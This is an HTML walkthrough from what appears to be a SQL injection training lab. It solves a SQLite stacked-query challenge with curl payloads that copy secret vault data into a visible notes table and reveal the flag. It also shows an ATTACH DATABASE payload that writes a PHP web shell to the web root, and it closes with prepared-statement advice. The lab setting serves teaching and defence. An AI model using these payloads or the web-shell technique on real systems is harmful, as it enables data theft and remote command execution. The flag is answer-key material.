<h4>Step 1: Test Normal Note Insertion</h4>
<p>Add a normal note to see how the application works.</p>

<div class="terminal">
    <div class="terminal-header">
        <span class="terminal-dot red"></span>
        <span class="terminal-dot yellow"></span>
        <span class="terminal-dot green"></span>
        <span class="terminal-title">Step 1. Normal Insertion</span>
    </div>
    <div class="terminal-body">
        <span class="prompt">$ </span>curl -s -x http://127.0.0.1:8080 "http://localhost/SQLi-Arena/sqlite/lab7" \<br> --data-urlencode "title=test"<br>
        <span class="prompt">SQL: </span>INSERT INTO notes (title, body) VALUES ('test', 'User note')<br><br>
        <span class="prompt">Response: </span><strong>Note added successfully!</strong><br><br>
        <span class="prompt">Existing Notes:</span><br>
        ID | Title | Body<br>
        4 | test | User note<br>
        3 | Ideas | New caching strategy for API responses<br>
        2 | TODO List | Fix login bug, update dependencies<br>
        1 | Meeting Notes | Discuss Q3 roadmap with engineering team
    </div>
</div>

<h4>Step 2: Confirm Stacked Queries</h4>
<p>
    The application uses <code>$conn-&gt;exec()</code> which supports multiple statements.
    Close the INSERT and add a second statement.
</p>

<div class="terminal">
    <div class="terminal-header">
        <span class="terminal-dot red"></span>
        <span class="terminal-dot yellow"></span>
        <span class="terminal-dot green"></span>
        <span class="terminal-title">Step 2. Stacked Query Test</span>
    </div>
    <div class="terminal-body">
        <span class="prompt">// Need to close BOTH title and body values:</span><br>
        <span class="prompt">// INSERT INTO notes (title, body) VALUES ('[input]', 'User note')</span><br><br>
        <span class="prompt">$ </span>curl -s -x http://127.0.0.1:8080 "http://localhost/SQLi-Arena/sqlite/lab7" \<br> --data-urlencode "title=x', 'y'); SELECT 1; --"<br>
        <span class="prompt">SQL: </span>INSERT INTO notes (title, body) VALUES ('x', 'y'); SELECT 1; --', 'User note')<br><br>
        <span class="prompt">Response: </span><strong>Note added successfully!</strong> (both INSERT and SELECT executed)
    </div>
</div>

<h4>Step 3: Extract Flag via Stacked INSERT</h4>
<p>
    Copy the vault data into the notes table using a stacked <code>INSERT ... SELECT</code>.
</p>

<div class="terminal">
    <div class="terminal-header">
        <span class="terminal-dot red"></span>
        <span class="terminal-dot yellow"></span>
        <span class="terminal-dot green"></span>
        <span class="terminal-title">Step 3. Exfiltrate via INSERT SELECT</span>
    </div>
    <div class="terminal-body">
        <span class="prompt">$ </span>curl -s -x http://127.0.0.1:8080 "http://localhost/SQLi-Arena/sqlite/lab7" \<br> --data-urlencode "title=x', 'y'); INSERT INTO notes (title, body) SELECT 'LEAKED', vault_key FROM vault; --"<br><br>
        <span class="prompt">Response: </span><strong>Note added successfully!</strong><br><br>
        <span class="prompt">Existing Notes (updated):</span><br>
        ID | Title | Body<br>
        6 | LEAKED | <strong>FLAG{sq_4tt4ch_db_wr1t3}</strong><br>
        5 | x | y<br>
        4 | test | User note<br>
        3 | Ideas | New caching strategy for API responses<br>
        2 | TODO List | Fix login bug, update dependencies<br>
        1 | Meeting Notes | Discuss Q3 roadmap with engineering team
    </div>
</div>

<p>The flag appears directly in the "Existing Notes" section as a leaked entry!</p>

<h4>Step 4: Submit the Flag</h4>
<p>
    Copy the flag and paste it into the verification form:
    <code>FLAG{sq_4tt4ch_db_wr1t3}</code>.
</p>

<div class="terminal">
    <div class="terminal-header">
        <span class="terminal-dot red"></span>
        <span class="terminal-dot yellow"></span>
        <span class="terminal-dot green"></span>
        <span class="terminal-title">curl. Full Exploit</span>
    </div>
    <div class="terminal-body">
        <span class="prompt">$ </span>curl -s -x http://127.0.0.1:8080 "http://localhost/SQLi-Arena/sqlite/lab7" \<br> --data-urlencode "title=x', 'y'); INSERT INTO notes (title, body) SELECT 'LEAKED', vault_key FROM vault; --"
    </div>
</div>

<h4>Step 5: ATTACH DATABASE Technique (Advanced Concept)</h4>
<p>
    SQLite's <code>ATTACH DATABASE</code> command can create a new database file at any writable
    path on the filesystem. Combined with stacked queries, this allows writing arbitrary content.
</p>

<div class="terminal">
    <div class="terminal-header">
        <span class="terminal-dot red"></span>
        <span class="terminal-dot yellow"></span>
        <span class="terminal-dot green"></span>
        <span class="terminal-title">Step 5. ATTACH DATABASE (Conceptual)</span>
    </div>
    <div class="terminal-body">
        <span class="prompt">// Create a new SQLite DB at a writable path:</span><br>
        <span class="prompt">Input: </span>x', 'y'); ATTACH DATABASE '/tmp/pwned.db' AS pwned; CREATE TABLE pwned.loot(data TEXT); INSERT INTO pwned.loot SELECT vault_key FROM vault; --<br><br>
        <span class="prompt">// In a real attack, write a PHP web shell:</span><br>
        <span class="prompt">Input: </span>x', 'y'); ATTACH DATABASE '/var/www/html/shell.php' AS pwned; CREATE TABLE pwned.s(c TEXT); INSERT INTO pwned.s VALUES ('&lt;?php system($_GET["cmd"]); ?&gt;'); --<br><br>
        <span class="prompt">// The SQLite file contains binary headers, but PHP still executes embedded PHP tags.</span><br>
        <span class="prompt">// Note: ATTACH may be restricted by SQLite authorization callbacks in production.</span>
    </div>
</div>

<h4>Step 6: exec() vs query() in SQLite</h4>
<div class="terminal">
    <div class="terminal-header">
        <span class="terminal-dot red"></span>
        <span class="terminal-dot yellow"></span>
        <span class="terminal-dot green"></span>
        <span class="terminal-title">Step 6. API Comparison</span>
    </div>
    <div class="terminal-body">
        <span class="prompt">$conn->exec($sql): </span>Supports multiple statements (stacked queries)<br>
        <span class="prompt">$conn->query($sql): </span>Single statement only -- stacked queries fail<br>
        <span class="prompt">$conn->querySingle(): </span>Single statement, returns first column of first row<br><br>
        <span class="prompt">Lesson: </span>Never use exec() with user input!
    </div>
</div>

<div class="result-success result-box">
    <strong>Key Takeaway:</strong> <code>$conn-&gt;exec()</code> supports stacked queries in SQLite --
    <code>$conn-&gt;query()</code> does not. Stacked queries allow INSERT INTO ... SELECT to copy
    secret data into visible tables. <code>ATTACH DATABASE '/path/to/file' AS alias</code> creates
    a new SQLite database file anywhere writable, potentially enabling PHP web shells, cron jobs,
    or SSH key injection. Never use <code>exec()</code> with user input: use <code>prepare()</code>
    + <code>bindValue()</code>.
</div>
